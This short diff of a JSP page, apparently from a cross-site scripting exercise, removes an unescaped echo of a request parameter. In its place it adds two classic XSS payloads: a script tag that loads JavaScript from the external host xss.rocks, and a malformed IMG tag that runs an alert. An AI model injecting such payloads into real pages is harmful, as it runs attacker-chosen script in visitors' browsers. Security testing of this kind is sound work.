@@ -2,8 +2,9 @@
 <body>
 <h2>Hello World! Hello Welcome to my world</h2>
   
-  <% String eid = request.getParameter("eid"); %> 
-	
-	Employee ID: <%= eid %>
+<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+
+
 </body>
 </html>
